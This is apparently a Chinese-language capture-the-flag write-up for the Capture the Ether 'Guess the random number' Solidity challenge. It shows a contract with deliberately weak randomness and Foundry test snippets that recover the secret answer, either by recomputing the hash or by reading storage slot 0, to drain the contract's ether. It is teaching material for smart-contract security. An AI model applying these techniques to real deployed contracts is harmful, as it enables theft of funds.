# Guess the random number

## 题目描述

[原题链接](https://capturetheether.com/challenges/lotteries/guess-the-random-number/)

原题目要求 GuessTheRandomNumberChallenge 合约的 ether 余额为 0。而调用 guess 并输入答案，如果答案等于 answer 即可转移 2 ether 出去。

## 运行

**安装 Foundry**

根据[Foundry 官方文档](https://getfoundry.sh/)配置好运行环境。

**运行测试**

```sh
$ cd WTF-CTF

$ forge test -C src/Capture_the_Ether/Lotteries/Guess_the_random_number -vvv
```

## 功能简述

在 GuessTheRandomNumberChallenge 合约中，设置了一个 secret 变量 answer，并在部署时使用 blockhash，block.timestamp
等初始化：
```solidity
contract GuessTheRandomNumberChallenge {
    uint8 answer;

    constructor() payable {
        require(msg.value == 1 ether);
        answer = uint8(uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
    }
    ...
}
```
因此我们有两个思路来完成挑战。

**思路 1**

既然部署时的 block.number, block.timestamp 是可以拿到的，我们可以记录这些值，然后计算出 answer，这就是 testGuessTheRandomNumber1 的解决思路：
```solidity
        // Suppose several blocks have passed
        vm.roll(deployBlockNumber+10);

        uint8 answer = uint8(uint(keccak256(abi.encodePacked(blockhash(deployBlockNumber - 1), deployTime))));
        emit log_named_uint("answer", answer);

        vm.startPrank(hacker);
        guessTheRandomNumberChallenge.guess{value: 1 ether}(answer);
        vm.stopPrank();
```

**思路 2**

answer 虽然是私有变量，但是我们可以通过 GuessTheRandomNumberChallenge 本地的 storage 布局以及 json-rpc 里面的 [eth_getStorageAt](https://ethereum.org/en/developers/docs/apis/json-rpc/#eth_getstorageat) 得到答案：

```sh
forge inspect ./src/Capture_the_Ether/Lotteries/Guess_the_random_number/GuessTheRandomNumberChallenge.sol:GuessTheRandomNumberChallenge storage --pretty
| Name   | Type  | Slot | Offset | Bytes | Contract                                                                                                                |
| ------ | ----- | ---- | ------ | ----- | ----------------------------------------------------------------------------------------------------------------------- |
| answer | uint8 | 0    | 0      | 1     | src/Capture_the_Ether/Lotteries/Guess_the_random_number/GuessTheRandomNumberChallenge.sol:GuessTheRandomNumberChallenge |
```

可以看出 slot 0 就存储了 answer。在本地测试中，我们使用 foundry 的 cheatcode: `vm.load()` 来代替 `eth_getStorageAt`，这是 testGuessTheRandomNumber2 的思路：

```solidity
        // 获取 slot 0 里面的值，这里就是 answer。
        uint answer = uint(vm.load(address(guessTheRandomNumberChallenge), bytes32(uint(0))));

        emit log_named_uint("answer", answer);

        vm.startPrank(hacker);
        guessTheRandomNumberChallenge.guess{value: 1 ether}(uint8(answer));
        vm.stopPrank();
```
